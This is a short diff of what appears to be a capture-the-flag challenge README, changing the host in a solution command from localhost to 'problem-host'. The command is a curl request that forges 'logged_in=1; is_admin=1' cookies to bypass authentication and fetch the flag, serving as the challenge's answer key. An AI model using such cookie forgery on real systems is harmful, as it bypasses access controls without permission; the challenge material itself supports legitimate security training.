@@ -40,7 +40,7 @@ Deploy the contents of `server/` with an up-to-date version of Node.js. Pass in 
 
 Alternatively:
 ```
-curl -b "logged_in=1; is_admin=1;" http://localhost:1337/flag | grep 'camp{'
+curl -b "logged_in=1; is_admin=1;" http://problem-host/flag | grep 'camp{'
 ```
 
 ## Author
